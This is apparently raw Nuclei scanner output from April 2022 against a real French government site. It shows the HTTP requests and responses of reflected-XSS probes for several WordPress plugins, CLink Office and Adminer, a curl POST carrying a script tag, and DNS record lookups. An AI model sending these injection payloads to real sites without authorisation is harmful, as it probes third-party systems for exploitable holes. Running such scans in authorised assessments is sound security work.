info.name: My Calendar <= 3.1.9 - Reflected Cross-Site Scripting (XSS)
author: daffainfo
dhiyaneshdk
info.description: The my-calendar plugin before 3.1.10 for WordPress has XSS. Triggered via unescaped usage of URL parameters in multiple locations presented in the public view of a site.

request:
GET /?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: potentiel.beta.gouv.fr
User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
response:
HTTP/1.1 200 OK Content-Length: 12599 Content-Security-Policy: default-src 'self' metabase.potentiel.beta.gouv.fr;connect-src 'self' 'unsafe-inline' analytics.potentiel.beta.gouv.fr;img-src 'self' data:;font-src 'self' data:;style-src 'self' data: 'unsafe-inline';script-src 'unsafe-inline' 'self' metabase.potentiel.beta.gouv.fr analytics.potentiel.beta.gouv.fr;object-src 'none' Content-Type: text/html; charset=utf-8 Cross-Origin-Opener-Policy: same-origin Cross-Origin-Resource-Policy: same-origin Date: Tue, 26 Apr 2022 02:54:50 GMT Etag: W/"3137-gMO8p5IIazQjH7JJCRCYwVM1qYE" Expect-Ct: max-age=0 Keep-Alive: timeout=5 Origin-Agent-Cluster: ?1 Referrer-Policy: strict-origin Sozu-Id: 01G1HWP03DMSS9JKZYWEY9Z04B Strict-Transport-Security: max-age=63072000; preload X-Content-Type-Options: nosniff X-Dns-Prefetch-Control: off X-Download-Options: noopen X-Frame-Options: SAMEORIGIN X-Permitted-Cross-Domain-Policies: none X-Xss-Protection: 0 Potentiel - Suivi des Projets d'Energies Renouvelables

info.name: MX Record Detection
author: pdteam
info.description: An MX record was detected. MX records direct emails to a mail exchange server.

request:
;; opcode: QUERY, status: NOERROR, id: 65360
;; flags: rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version 0; flags: ; udp: 4096

;; QUESTION SECTION:
;potentiel.beta.gouv.fr.	IN	 MX
response:
;; opcode: QUERY, status: NOERROR, id: 65360
;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version 0; flags: ; udp: 512

;; QUESTION SECTION:
;potentiel.beta.gouv.fr.	IN	 MX

;; ANSWER SECTION:
potentiel.beta.gouv.fr.	300	IN	MX	20 mx2.alwaysdata.com.
potentiel.beta.gouv.fr.	300	IN	MX	10 mx1.alwaysdata.com.

info.name: NS Record Detection
author: pdteam
info.description: An NS record was detected. An NS record delegates a subdomain to a set of name servers.

request:
;; opcode: QUERY, status: NOERROR, id: 22055
;; flags: rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version 0; flags: ; udp: 4096

;; QUESTION SECTION:
;potentiel.beta.gouv.fr.	IN	 NS
response:
;; opcode: QUERY, status: NOERROR, id: 22055
;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version 0; flags: ; udp: 512

;; QUESTION SECTION:
;potentiel.beta.gouv.fr.	IN	 NS

;; ANSWER SECTION:
potentiel.beta.gouv.fr.	300	IN	NS	dns1.alwaysdata.com.
potentiel.beta.gouv.fr.	300	IN	NS	dns2.alwaysdata.com.

info.name: WAF Detection
author: dwisiswant0
lu4nx
info.description: A web application firewall was detected.

request:
POST / HTTP/1.1
Host: potentiel.beta.gouv.fr
User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)
Connection: close
Content-Length: 27
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
response:
HTTP/1.1 404 Not Found Content-Length: 140 Content-Security-Policy: default-src 'none' Content-Type: text/html; charset=utf-8 Cross-Origin-Opener-Policy: same-origin Cross-Origin-Resource-Policy: same-origin Date: Tue, 26 Apr 2022 02:55:04 GMT Expect-Ct: max-age=0 Keep-Alive: timeout=5 Origin-Agent-Cluster: ?1 Referrer-Policy: strict-origin Sozu-Id: 01G1HWPE4CQE9S2X9MGNJ477E2 Strict-Transport-Security: max-age=63072000; preload X-Content-Type-Options: nosniff X-Dns-Prefetch-Control: off X-Download-Options: noopen X-Frame-Options: SAMEORIGIN X-Permitted-Cross-Domain-Policies: none X-Xss-Protection: 0 Error 
Cannot POST /
curl-command: curl -X 'POST' -d '_=<script>alert(1)</script>' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Host: potentiel.beta.gouv.fr' -H 'User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)' 'https://potentiel.beta.gouv.fr/'

info.name: CLink Office v2 XSS
author: pikpikcu
info.description: A cross-site scripting (XSS) vulnerability in the index page of the CLink Office 2.0 management console allows remote attackers to inject arbitrary web script or HTML via the lang parameter.

request:
GET /?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1 HTTP/1.1
Host: potentiel.beta.gouv.fr
User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
response:
HTTP/1.1 200 OK Content-Length: 12622 Content-Security-Policy: default-src 'self' metabase.potentiel.beta.gouv.fr;connect-src 'self' 'unsafe-inline' analytics.potentiel.beta.gouv.fr;img-src 'self' data:;font-src 'self' data:;style-src 'self' data: 'unsafe-inline';script-src 'unsafe-inline' 'self' metabase.potentiel.beta.gouv.fr analytics.potentiel.beta.gouv.fr;object-src 'none' Content-Type: text/html; charset=utf-8 Cross-Origin-Opener-Policy: same-origin Cross-Origin-Resource-Policy: same-origin Date: Tue, 26 Apr 2022 02:55:18 GMT Etag: W/"314e-VD3gx3v2HujGyLM5TjW4kFCaHAA" Expect-Ct: max-age=0 Keep-Alive: timeout=5 Origin-Agent-Cluster: ?1 Referrer-Policy: strict-origin Sozu-Id: 01G1HWPVMZZ0TM8N0B2Q98H2MV Strict-Transport-Security: max-age=63072000; preload X-Content-Type-Options: nosniff X-Dns-Prefetch-Control: off X-Download-Options: noopen X-Frame-Options: SAMEORIGIN X-Permitted-Cross-Domain-Policies: none X-Xss-Protection: 0 Potentiel - Suivi des Projets d'Energies Renouvelables

info.name: DNS TXT Record Detected
author: pdteam
info.description: A DNS TXT record was detected. The TXT record lets a domain admin leave notes on a DNS server.

request:
;; opcode: QUERY, status: NOERROR, id: 38648
;; flags: rd ad; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version 0; flags: ; udp: 4096

;; QUESTION SECTION:
;potentiel.beta.gouv.fr.	IN	 TXT
response:
;; opcode: QUERY, status: NOERROR, id: 38648
;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version 0; flags: ; udp: 512

;; QUESTION SECTION:
;potentiel.beta.gouv.fr.	IN	 TXT

;; ANSWER SECTION:
potentiel.beta.gouv.fr.	300	IN	TXT	"v=spf1 include:_spf.alwaysdata.com include:spf.mailjet.com ?all"
potentiel.beta.gouv.fr.	300	IN	TXT	"google-site-verification=TFLKznVdoFHp8aVSWp4Wjg00cOLTfJR6Vldor6flWYE"

info.name: Adminer reflected XSS via the table parameter
author: daffainfo
info.description: Adminer is open-source database management software. A cross-site scripting vulnerability in Adminer versions 4.6.1 to 4.8.0 affects users of MySQL, MariaDB, PgSQL and SQLite. XSS is in most cases prevented by strict CSP in all modern browsers. The only exception is when Adminer is using a `pdo_` extension to communicate with the database (it is used if the native extensions are not enabled). In browsers without CSP, Adminer versions 4.6.1 to 4.8.0 are affected. The vulnerability is patched in version 4.8.1. As workarounds, one can use a browser supporting strict CSP or enable the native PHP extensions (e.g. `mysqli`) or disable displaying PHP errors (`display_errors`).

request:
GET /?server=db&username=root&db=mysql&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: potentiel.beta.gouv.fr
User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
response:
HTTP/1.1 200 OK Content-Length: 12651 Content-Security-Policy: default-src 'self' metabase.potentiel.beta.gouv.fr;connect-src 'self' 'unsafe-inline' analytics.potentiel.beta.gouv.fr;img-src 'self' data:;font-src 'self' data:;style-src 'self' data: 'unsafe-inline';script-src 'unsafe-inline' 'self' metabase.potentiel.beta.gouv.fr analytics.potentiel.beta.gouv.fr;object-src 'none' Content-Type: text/html; charset=utf-8 Cross-Origin-Opener-Policy: same-origin Cross-Origin-Resource-Policy: same-origin Date: Tue, 26 Apr 2022 02:56:20 GMT Etag: W/"316b-EkhkMHsvRmG/CZcBbfclJU2d+54" Expect-Ct: max-age=0 Keep-Alive: timeout=5 Origin-Agent-Cluster: ?1 Referrer-Policy: strict-origin Sozu-Id: 01G1HWRRK34XYBE9B0C1Y4B8YM Strict-Transport-Security: max-age=63072000; preload X-Content-Type-Options: nosniff X-Dns-Prefetch-Control: off X-Download-Options: noopen X-Frame-Options: SAMEORIGIN X-Permitted-Cross-Domain-Policies: none X-Xss-Protection: 0 Potentiel - Suivi des Projets d'Energies Renouvelables

info.name: Frontend Uploader <= 0.9.2 - Unauthenticated Cross-Site Scripting
author: daffainfo
info.description: The Frontend Uploader WordPress plugin prior to v.0.9.2 was affected by an unauthenticated Cross-Site Scripting security vulnerability.

request:
GET /?page_id=0&&errors[fu-disallowed-mime-type][0][name]=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1

User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)

info.name: WordPress Plugin Download Monitor < 3.3.5.9 - Reflected Cross-Site Scripting
author: daffainfo
info.description: A cross-site scripting vulnerability in the Download Monitor plugin before 3.3.5.9 for WordPress allows remote attackers to inject arbitrary web script or HTML via the dlsearch parameter to the default URI.

request:
GET /?dlsearch=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1

User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)

Accept-Language: en
Accept-Encoding: gzip
